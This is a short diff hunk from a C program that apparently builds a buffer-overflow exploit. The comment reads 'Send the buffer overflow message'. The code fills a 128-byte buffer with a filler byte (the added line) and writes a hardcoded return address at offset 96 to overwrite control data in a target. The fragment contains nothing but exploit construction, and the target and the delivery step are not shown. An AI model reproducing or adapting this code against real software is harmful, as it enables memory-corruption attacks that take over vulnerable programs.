@@ -73,6 +73,7 @@ int main(int argc, char *argv[])
 
     /* Send the buffer overflow message */
     char buffer[128];
+    memset(buffer, 0xb4, 128);
     /* 64 bytes of regular buffer + 32 bytes after + 8 bytes for the address */
     uint32_t addr = 0xc0986ea0;
     memcpy(&buffer[64+32], &addr, sizeof(addr));
